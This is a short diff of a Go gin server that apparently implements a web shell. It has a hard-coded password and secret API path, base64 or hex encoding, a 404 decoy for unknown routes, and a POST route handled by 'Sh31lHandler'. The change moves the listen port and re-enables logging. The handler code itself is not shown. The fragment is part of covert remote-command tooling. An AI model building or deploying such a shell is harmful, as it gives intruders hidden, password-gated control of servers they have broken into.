@@ -21,7 +21,7 @@ import (
 	"time"
 )
 
-const LISTEN = "0.0.0.0:62848"
+const LISTEN = "0.0.0.0:24356"
 const PWD = "S1lLyAQNXYUASEDFLVBWSFWECSSVS1lLy"
 const API = "S1lLyXCVBRTSDBAVWERHHWARTGJRS1lLy"
 const ENCODER = "base64"           // "" or "base64" or "hex"
@@ -433,8 +433,8 @@ func r404(c *gin.Context) {
 }
 
 func ginserver() {
-	gin.SetMode(gin.ReleaseMode)
-	gin.DefaultWriter = io.Discard
+	//gin.SetMode(gin.ReleaseMode)
+	//gin.DefaultWriter = io.Discard
 	r := gin.Default()
 	r.NoRoute(r404)
 	r.POST("/"+API, Sh31lHandler)
